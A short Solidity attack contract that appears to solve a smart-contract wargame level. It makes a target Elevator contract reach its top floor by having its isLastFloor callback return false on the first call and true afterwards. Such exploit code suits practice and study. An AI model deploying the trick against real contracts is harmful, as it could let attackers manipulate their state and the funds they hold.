// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Elevator{
    function goTo(uint _floor) external;
}

contract ElevatorHack {

    uint public contador = 0;
    Elevator public targetContract;

    constructor(address _targetContract){
        targetContract = Elevator(_targetContract);
    }

    function isLastFloor(uint _floor) external returns (bool){
        if(contador == 0){
            contador++;
            return false;
        }
        else{
            return true;
        }
    }

    function Attack() public{
        targetContract.goTo(10);
    }
}